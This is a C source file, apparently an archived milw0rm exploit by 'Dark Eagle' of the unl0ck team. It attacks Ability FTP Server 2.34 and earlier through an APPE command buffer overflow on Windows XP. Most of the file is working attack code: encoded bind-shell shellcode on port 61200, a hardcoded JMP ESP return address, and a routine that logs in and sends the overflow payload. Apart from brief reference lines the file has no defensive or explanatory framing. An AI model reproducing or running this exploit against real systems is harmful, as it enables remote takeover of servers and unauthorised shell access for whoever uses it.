/*

TESTED ON WINXP SP0 RUS

(c) by Dark Eagle
from unl0ck research team
http://unl0ck.void.ru

HAPPY NEW YEAR!

Greetz go out to: nekd0, antiq, fl0wsec (setnf, nuTshell), nosystem (CoKi), reflux...

*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// shellc0de by m00 team  bind 61200
char shellcode[]=
"\x90\x90\x90\x90\x90\xEB\x0F\x58\x80\x30\xBB\x40\x81\x38\x6D"
"\x30\x30\x21\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF\xFF\x52\xD7\xBA"
"\xBB\xBB\xE6\xEE\x8A\x60\xDF\x30\xB8\xFB\x28\x30\xF8\x44\xFB"
"\xCE\x42\x30\xE8\xB8\xDD\x8A\x69\xDD\x03\xBB\xAB\xDD\x3A\x81"
"\xF6\xE1\xCF\xBC\x92\x79\x52\x49\x44\x44\x44\x32\x68\x30\xC1"
"\x87\xBA\x6C\xB8\xE4\xC3\x30\xF0\xA3\x30\xC8\x9B\x30\xC0\x9F"
"\xBA\x6D\xBA\x6C\x47\x16\xBA\x6B\x2D\x3C\x46\xEA\x8A\x72\x3B"
"\x7A\xB4\x48\x1D\xC9\xB1\x2D\xE2\x3C\x46\xCF\xA9\xFC\xFC\x59"
"\x5D\x05\xB4\xBB\xBB\xBB\x92\x75\x92\x4C\x52\x53\x44\x44\x44"
"\x8A\x7B\xDD\x30\xBC\x7A\x5B\xB9\x30\xC8\xA7\xBA\x6D\xBA\x7D"
"\x16\xBA\x6B\x32\x7D\x32\x6C\xE6\xEC\x36\x26\xB4\xBB\xBB\xBB"
"\xE8\xEC\x44\x6D\x36\x26\xE8\xBB\xBB\xBB\xE8\x44\x6B\x32\x7C"
"\x36\x3E\xE1\xBB\xBB\xBB\xEB\xEC\x44\x6D\x36\x36\x2C\xBB\xBB"
"\xBB\xEA\xD3\xB9\xBB\xBB\xBB\x44\x6B\x36\x26\xDE\xBB\xBB\xBB"
"\xE8\xEC\x44\x6D\x8A\x72\xEA\xEA\xEA\xEA\xD3\xBA\xBB\xBB\xBB"
"\xD3\xB9\xBB\xBB\xBB\x44\x6B\x32\x78\x36\x3E\xCB\xBB\xBB\xBB"
"\xEB\xEC\x44\x6D\xD3\xAB\xBB\xBB\xBB\x36\x36\x38\xBB\xBB\xBB"
"\xEA\xE8\x44\x6B\x36\x3E\xCE\xBB\xBB\xBB\xEB\xEC\x44\x6D\xD3"
"\xBA\xBB\xBB\xBB\xE8\x44\x6B\x36\x3E\xC7\xBB\xBB\xBB\xEB\xEC"
"\x44\x6D\x8A\x72\xEA\xEA\xE8\x44\x6B\xE4\xEB\x36\x26\xFC\xBB"
"\xBB\xBB\xE8\xEC\x44\x6D\xD3\x44\xBB\xBB\xBB\xD3\xFB\xBB\xBB"
"\xBB\x44\x6B\x32\x78\x36\x36\x93\xBB\xBB\xBB\xEA\xEC\x44\x6D"
"\xE8\x44\x6B\xE3\x32\xF8\xFB\x32\xF8\x87\x32\xF8\x83\x7C\xF8"
"\x97\xBA\xBA\xBB\xBB\x36\x3E\x83\xBB\xBB\xBB\xEB\xEC\x44\x6D"
"\xE8\xE8\x8A\x72\xEA\xEA\xEA\xD3\xBA\xBB\xBB\xBB\xEA\xEA\x36"
"\x26\x04\xBB\xBB\xBB\xE8\xEA\x44\x6B\x36\x3E\xA7\xBB\xBB\xBB"
"\xEB\xEC\x44\x6D\x44\x6B\x53\x34\x45\x44\x44\xFC\xDE\xCF\xEB"
"\xC9\xD4\xD8\xFA\xDF\xDF\xC9\xDE\xC8\xC8\xBB\xF7\xD4\xDA\xDF"
"\xF7\xD2\xD9\xC9\xDA\xC9\xC2\xFA\xBB\xFE\xC3\xD2\xCF\xEB\xC9"
"\xD4\xD8\xDE\xC8\xC8\xBB\xFC\xDE\xCF\xE8\xCF\xDA\xC9\xCF\xCE"
"\xCB\xF2\xD5\xDD\xD4\xFA\xBB\xF8\xC9\xDE\xDA\xCF\xDE\xEB\xC9"
"\xD4\xD8\xDE\xC8\xC8\xFA\xBB\xFC\xD7\xD4\xD9\xDA\xD7\xFA\xD7"
"\xD7\xD4\xD8\xBB\xCC\xC8\x89\xE4\x88\x89\xBB\xEC\xE8\xFA\xE8"
"\xCF\xDA\xC9\xCF\xCE\xCB\xBB\xEC\xE8\xFA\xE8\xD4\xD8\xD0\xDE"
"\xCF\xFA\xBB\xD9\xD2\xD5\xDF\xBB\xD7\xD2\xC8\xCF\xDE\xD5\xBB"
"\xDA\xD8\xD8\xDE\xCB\xCF\xBB\xB9\xBB\x54\xAB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBA\xBB\xBB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xD8\xD6\xDF\xBB\x6D\x30\x30\x21";


int conn(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("socket\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("connect() error!\n");
        exit(0);
          }
    printf("connected to %s\n", host);
    return sock;
}


void login(int sock, char *login, char *pass)
{

FILE *file;
char ubuf[1000], pbuf[1000], rc[200];
int i;
char bochka[2000], med[2000];

file = fopen("bochka.txt", "w+");

      memset(bochka, 0x00, 2000);
      memset(bochka, 0x43, 1000);
      *(long*)&bochka[969] = 0x77F5801C; // ntdll.dll JMP ESP ADDR...
      memcpy(bochka+strlen(bochka), &shellcode, sizeof(shellcode));

      sprintf(med, "APPE %s\r\n", bochka);
      fprintf(file, "%s", med);

      if ( strlen(pass) >= 100 )  { printf("2 long password!\n"); exit(0); }
      if ( strlen(login) >= 100 ) { printf("2 long login!\n"); exit(0);    }

      sprintf(ubuf, "USER %s\r\n", login);
      send(sock, ubuf, strlen(ubuf), 0);
      printf("USER sending...\n");
      Sleep(1000);
      printf("OK!\n");

      sprintf(pbuf, "PASS %s\r\n", pass);
      send(sock, pbuf, strlen(pbuf), 0);
      printf("PASS sending...\n");
      Sleep(1000);
      recv(sock, rc, 200, 0);
      if ( strstr(rc, "530")) {printf("Bad password!\n"); exit(0); }
      printf("OK!\n");
      Sleep(1000);
      printf("Sending 604KY C MEDOM!\n");
      send(sock, med, strlen(med), 0);
      Sleep(1000);
      printf("TrY To CoNnEcT tO...\n\n");

}

int main(int argc, char **argv)
{
    int sock = 0;
    int data;
    printf("\nAbility FTP Server <= 2.34 R00T exploit\n");
    printf("by Dark Eagle [ unl0ck team ]\nhttp://unl0ck.void.ru\n\n");

    if ( argc < 4 ) { printf("usage: un-aftp.exe <host> <username> <password>\n\n"); exit(0); }

    sock = conn(argv[1], 21);
    login(sock, argv[2], argv[3]);
    closesocket(sock);
    Sleep(2000);

    return 0;
}

//Reference:
//2004-10-23
//Ability Server 2.34 and below Remote APPE Buffer Overflow Exploit 	
//KaGra
//http://www.milw0rm.com/id.php?id=592

// milw0rm.com [2004-12-16]